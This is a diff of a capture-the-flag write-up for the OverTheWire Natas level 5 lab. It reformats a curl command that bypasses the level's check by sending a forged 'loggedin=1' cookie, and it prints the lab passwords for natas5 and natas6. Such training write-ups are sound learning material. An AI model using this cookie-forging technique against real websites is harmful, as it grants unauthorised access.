@@ -30,7 +30,8 @@ Access `http://natas5.natas.labs.overthewire.org` and retrieve the password to a
 ```
 curl http://natas5.natas.labs.overthewire.org/ \  
 -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK \  
--H "Cookie: _ga=GA1.1.325147876.1747444879; _ga_RD0K2239G0=GS2.1.s1748038204\$o13\$g1\$t1748038952\$j0\$l0\$h0; loggedin=1"  
+-H "Cookie: _ga=GA1.1.325147876.1747444879; _ga_RD0K2239G0=GS2.1.s1748038204\$o13\$g1\$t1748038952\$j0\$l0\$h0;  
+loggedin=1"  
 ```
 4. Upon execution, the response is: `Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned`
 
@@ -41,6 +42,8 @@ curl http://natas5.natas.labs.overthewire.org/ \
 ```
 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
 ```
+
+---
 
 ## ✅ CONCLUSION
 
